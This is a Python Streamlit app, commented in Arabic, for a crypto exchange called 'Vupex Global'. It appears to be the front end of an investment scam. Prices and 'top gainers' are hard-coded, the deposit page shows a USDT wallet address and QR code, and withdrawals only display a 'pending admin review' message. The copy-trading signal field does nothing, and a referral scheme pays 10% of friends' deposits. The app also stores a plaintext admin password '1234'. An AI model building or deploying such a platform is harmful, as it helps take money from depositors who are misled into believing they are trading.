import streamlit as st
import pandas as pd
import json
import os
import uuid
from datetime import datetime

# --- 1. إعدادات المنصة الاحترافية ---
st.set_page_config(page_title="Vupex Global | Alpha", page_icon="💎", layout="wide", initial_sidebar_state="collapsed")

# --- 2. محرك النظام وقاعدة البيانات ---
DB_FILE = "users_db.json"

def load_users():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {"basha": {"password": "1234", "id": "BOSS001", "balance": 100000.0, "total_deposited": 10000.0, "capital": 10000.0, "wallet": "T-MASTER-VAULT-XYZ", "role": "admin", "kyc": "Verified"}}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f)

# --- 3. تهيئة الجلسة (Session State) لمنع تسجيل الخروج ---
if 'auth' not in st.session_state: st.session_state.auth = None
if 'page' not in st.session_state: st.session_state.page = "🏠 الرئيسية"

def ch_pg(name):
    st.session_state.page = name

# --- 4. تصميم الـ CSS الفخم (XDCBIT Look) ---
st.markdown("""
<style>
    .main { background-color: #0d1117; color: #e1e1e1; font-family: 'Segoe UI', sans-serif; }
    [data-testid="stHeader"] { background-color: rgba(0,0,0,0); }
    [data-testid="stSidebar"] { display: none; }
    
    /* الهيدر العلوي */
    .app-header {
        background: linear-gradient(180deg, #161b22 0%, #0d1117 100%);
        padding: 25px 15px;
        border-radius: 0 0 25px 25px;
        text-align: center;
        border-bottom: 1px solid #30363d;
        margin-bottom: 20px;
    }
    
    /* بطاقات الأسعار الحية */
    .ticker-card {
        background-color: #161b22;
        border-radius: 12px;
        padding: 15px;
        border: 1px solid #30363d;
        text-align: center;
    }
    .price-up { color: #2ea043; font-weight: bold; }
    .price-down { color: #f8514Red; font-weight: bold; }

    /* بانر العرض */
    .promo-banner {
        background: linear-gradient(90deg, #1c232d 0%, #238636 100%);
        padding: 20px;
        border-radius: 15px;
        margin: 20px 0;
        border: 1px solid #30363d;
    }

    /* ستايل الأزرار لتشبه التطبيق */
    div.stButton > button {
        background-color: #161b22;
        color: white;
        border: 1px solid #30363d;
        border-radius: 10px;
        padding: 10px;
        transition: 0.3s;
    }
    div.stButton > button:hover {
        border-color: #2ea043;
        background-color: #1c232d;
    }
</style>
""", unsafe_allow_html=True)

# --- 5. منطق الدخول ---
db = load_users()

if st.session_state.auth is None:
    st.markdown("<div class='app-header'><h1>💎 VUPEX Exchange</h1><p>منصة التداول الرقمية الأقوى</p></div>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        u_log = st.text_input("اسم المستخدم")
        p_log = st.text_input("كلمة المرور", type="password")
        if st.button("دخول آمن"):
            if u_log in db and db[u_log]["password"] == p_log:
                st.session_state.auth = db[u_log]
                st.session_state.auth["u"] = u_log
                st.rerun()
            else: st.error("خطأ في البيانات")

# --- 6. المنصة الرئيسية (بعد الدخول) ---
else:
    u = st.session_state.auth
    
    # القائمة السفلية (التنقل الذكي)
    st.markdown("---")
    nav_home, nav_mkt, nav_trd, nav_ast = st.columns(4)
    with nav_home: st.button("🏠 الرئيسية", on_click=ch_pg, args=("home",), use_container_width=True)
    with nav_mkt:  st.button("📊 الأسواق", on_click=ch_pg, args=("markets",), use_container_width=True)
    with nav_trd:  st.button("🎯 الصفقات", on_click=ch_pg, args=("trade",), use_container_width=True)
    with nav_ast:  st.button("💰 الأصول", on_click=ch_pg, args=("assets",), use_container_width=True)
    st.markdown("---")

    # --- صفحة: الرئيسية ---
    if st.session_state.page == "home":
        st.markdown(f"""
            <div class="app-header">
                <h1>VUPEX EXCHANGE</h1>
                <p>مرحباً {u['u']} | رصيدك المتاح: <span style='color:#2ea043'>${u['balance']:,}</span></p>
            </div>
        """, unsafe_allow_html=True)

        # بطاقات الأسعار
        c1, c2, c3 = st.columns(3)
        with c1: st.markdown("<div class='ticker-card'>BTC/USDT<br><span class='price-up'>66,871.84</span></div>", unsafe_allow_html=True)
        with c2: st.markdown("<div class='ticker-card'>ETH/USDT<br><span class='price-up'>3,452.12</span></div>", unsafe_allow_html=True)
        with c3: st.markdown("<div class='ticker-card'>TRX/USDT<br><span style='color:#f85149'>0.1314</span></div>", unsafe_allow_html=True)

        # أزرار الإجراءات السريعة
        st.markdown("### الوصول السريع")
        act1, act2, act3, act4 = st.columns(4)
        with act1: st.button("📥\nإيداع", on_click=ch_pg, args=("assets",), key="q_dep")
        with act2: st.button("📤\nسحب", on_click=ch_pg, args=("assets",), key="q_with")
        with act3: st.button("👥\nإحالة", on_click=ch_pg, args=("ref",), key="q_ref")
        with act4: st.button("🛠️\nدعم", key="q_sup")

        # البانر الترويجي
        st.markdown("<div class='promo-banner'><h3>🚀 قم بشراء العملات بسرعة</h3>آمن ومريح وموثق بالكامل</div>", unsafe_allow_html=True)

        # قائمة أعلى الأرباح (Gainers)
        st.markdown("### 🔥 أعلى الأرباح")
        gainers = [("ADA/USDT", "0.2473", "+3.04%"), ("YFI/USDT", "2,484.73", "+2.90%"), ("FIL/USDT", "0.838", "+2.57%")]
        for name, price, change in gainers:
            col_n, col_p, col_c = st.columns([2, 2, 1])
            col_n.write(f"🪙 {name}")
            col_p.write(f"**{price}**")
            col_c.markdown(f"<span style='background-color:#2ea043; padding:5px; border-radius:5px;'>{change}</span>", unsafe_allow_html=True)
            st.divider()

    # --- صفحة: الأسواق ---
    elif st.session_state.page == "markets":
        st.title("📊 الأسواق الحية")
        st.write("هنا تظهر قائمة بجميع العملات المتاحة للتداول..")
        st.dataframe(pd.DataFrame({
            "الزوج": ["BTC/USDT", "ETH/USDT", "SOL/USDT", "BNB/USDT"],
            "السعر": [66800, 3450, 145, 580],
            "التغيير": ["+1.2%", "+0.8%", "+5.4%", "-0.3%"]
        }), use_container_width=True)

    # --- صفحة: الصفقات (نسخ التداول) ---
    elif st.session_state.page == "trade":
        st.title("🎯 مركز نسخ الصفقات")
        st.components.v1.html("""
            <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=H&theme=dark" width="100%" height="400" frameborder="0"></iframe>
        """, height=400)
        st.markdown("---")
        sig_code = st.text_input("أدخل كود الإشارة للمضاربة")
        if st.button("تفيذ الصفقة"):
            st.info("جاري التحقق من الكود ورصيد المحفظة...")

    # --- صفحة: الأصول (المحفظة والسحب) ---
    elif st.session_state.page == "assets":
        st.title("💰 محفظة الأصول")
        st.metric("إجمالي الرصيد", f"${u['balance']:,}")
        
        t1, t2 = st.tabs(["📥 إيداع", "📤 سحب"])
        with t1:
            st.write("إيداع USDT (Network: TRC20)")
            st.code(u['wallet'], language="text")
            st.image(f"https://api.qrserver.com/v1/create-qr-code/?size=150x150&data={u['wallet']}")
        with t2:
            st.write("سحب الأموال")
            amt = st.number_input("المبلغ", min_value=10.0)
            if st.button("تأكيد السحب"):
                st.warning("يتم مراجعة طلبك حالياً من قبل الإدارة.")

    # --- صفحة: الإحالة (Referral) ---
    elif st.session_state.page == "ref":
        st.title("👥 برنامج الإحالة")
        ref_url = f"https://vupex-global.streamlit.app/?ref={u['id']}"
        st.success("اربح 10% من إيداعات أصدقائك!")
        st.code(ref_url, language="text")
        st.write("عدد أصدقائك المسجلين: 0")

    # زر الخروج في أسفل القائمة الجانبية (اختياري)
    if st.sidebar.button("تسجيل الخروج"):
        st.session_state.auth = None
        st.rerun()
